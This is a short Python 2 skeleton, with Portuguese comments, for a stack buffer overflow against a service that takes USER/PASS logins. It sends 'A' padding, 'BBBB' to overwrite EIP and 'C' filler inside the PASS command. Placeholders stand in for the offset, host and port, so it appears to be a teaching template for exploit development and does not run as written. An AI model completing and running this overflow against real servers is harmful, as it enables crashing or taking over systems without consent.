#!/usr/bin/python
import socket
bytes = "A" * valor pra chegar no EIP + "BBBB" + "C" * (valor total - valor pra chegar no EIP mais EIP)
#chuta uns 100 bytes a mais dos bytes que aplicaçao aceita ate travar
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("host",port))
	r = s.recv(1024)
	print r

	s.send("USER usuario\r\n")
	r = s.recv(1024)
	print r

	s.send("PASS "+bytes+"\r\n") #observe o +bytes+ aqui
	r = s.recv(1024)
	print r

	s.send("QUIT\r\n")
	r = s.recv(1024)
	print r
except:
	print "Erro ao conectar"
